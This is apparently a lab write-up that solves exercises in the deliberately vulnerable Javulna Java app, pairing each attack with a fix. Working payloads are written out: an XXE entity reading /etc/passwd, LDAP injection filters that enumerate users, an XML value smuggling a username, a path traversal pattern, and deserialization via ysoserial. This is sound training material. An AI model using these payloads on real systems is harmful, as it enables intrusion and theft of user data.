# Exercise 1
Use sql-injection to execute custom queries to access the database name, table names, etc.
I also used sqlmap tool to automate the sql-injection attack.

## Fix
use a prepared statement instead of a sql string

# Exercise 2
This is just a required action to perform the other exercises.

# Exercise 3
Add xml in the password query parameter so the replacement username/password is picked from this input.
E.g. newPassword=aPassword</pwd><userName>anotherUser</userName><pwd>

## Fix
allow only alfanumeric values for the new password

# Exercise 4
Use number overflow to get a negative price for an item.
Enter a large number for the amount of expensive items so that the price exceeds the maximum integer value i.e. 2**31-1.

## Fix
use a long to calculate the price

# Exercise 5
Use path traversal to download files outside the allowed folder.
By using a filename like ../../../something/file.ext you can read a file that is not in the applications' file space.

## Fix
do not allow a path in the download filename

## Other
- you can upload a file that is infected by a virus
  - place uploaded files in a temporary location that is scanned for virusses and only move safe files to the application file space
- you can upload a huge file filling the disk space
  - put a limit on the size of the file to upload
- you can upload an unrestricted amount of files so you use up all nodes on the file system
  - put a limit on the number of files in the applications' file space
- you can trick the user by providing a wrong file extension

# Exercise 6
The cookie `USER_AUTHENTICATION_EXTRA_SECURITY` is Base64 encoded. We can see that from the start of tha value which is 'rO0'.
So we can just decode the content and find the original java object that was serialized:
```java
srcom.kalavit.javulna.model.UsermP=LemailAddresstLjava/lang/String;Lmottoq~Lnameq~Lpasswordq~Lsexq~L
webPageUrlq~xr$com.kalavit.javulna.model.BaseEntity@qL	createdAttLjava/util/Date;Lidq~L
lastUpdatedAtq~xppt2ptdarth@lucasarts.comt,I see a red door and I want it paint it backtDarth Vadert
IamYourFathertmt,http://www.starwars.com/databank/darth-vader
```
We can see that the cookie actually just contains a plain java object. This means we can replace it with one that we provide; it will be deserialized when the application finds the cookie.
We can make use of a payload generator to create an object that exploits the apache commons-collections 4.0 vulnerability.
The object we create will execute a system command from its constructor, allowing us to execute code on the target machine where the application runs.

The tool I used to generate the payload is [ysoserial](https://github.com/frohoff/ysoserial)

To encode the payload again we just have to execute the built-in command on a linux machine:
> base4 --wrap=0 payload

## Fix
Create a custom _ObjectInputStream_ that throws an exception if it tries to resolve any other class but the _User_ class (or its parent class _BaseEntity_).

## Alternate fix
We can use another way to serialize and deserialize the _User_ objects. We could use Google Gson to create a json representation of the object we want to serialize.

Additionally we could only serialize non-sensitive data and omit the sensitive data like the _password_ property.
And on top of that we could opt to use another encoding schema than Base64 to prevent a malicious user to decode the cookie and find out what value it contains.

# Exercise 7
The method to create a movie by passing an xml payload as a string parameter of the http request is vulnerable to xxe.
It allows us to pass a xml document that references a external entity and put its content in the movie we create. Since the request returns us the movie data, we can use this exploit to retrieve any data from the remote system or to which the remote system has access.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE createMovie [  
   <!ELEMENT createMovie ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
<createMovie>
	<title>Star Wars: The empire strikes back</title>
	<description>&xxe;</description>
	<genre>sci-fi</genre>
</createMovie>
```
The above payload retuens us the content of the /etc/passwd file that contains all the users from the remote system.

## Fix
Disable the option for the document builder to pass it a custom DTD.
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

# Exercise 8
The LDAP Service is vulnerable to LDAP injection.

We can use a wildcard to match the password to find user data without knowing the user's password:
>{{javulna_host}}/rest/ldap?username=kriszta&password=*

We can also use wildcards in the username to find user's whose name starts with a given letter
>{{javulna_host}}/rest/ldap?username=j*&password=*

## Find all data
By passing a wildcard for both username and password, we get the first user in the directory:
>{{javulna_host}}/rest/ldap?username=*&password=*

So we find **aladar**.

Now we know the first user, we can search for the first user alfabetically after 'aladar':
>{{javulna_host}}/rest/ldap?username=*)(uid>=aladar0))(|(uid=*&password=*

Now we know the next user is **geza**

We can keep repeating this until no user data is found any more:
>{{javulna_host}}/rest/ldap?username=*)(uid>=geza0))(|(uid=*&password=*

>{{javulna_host}}/rest/ldap?username=*)(uid>=kriszta0))(|(uid=*&password=*

## Fix
Use a LDAP filter builder to create a search filter based on exact match for username and password.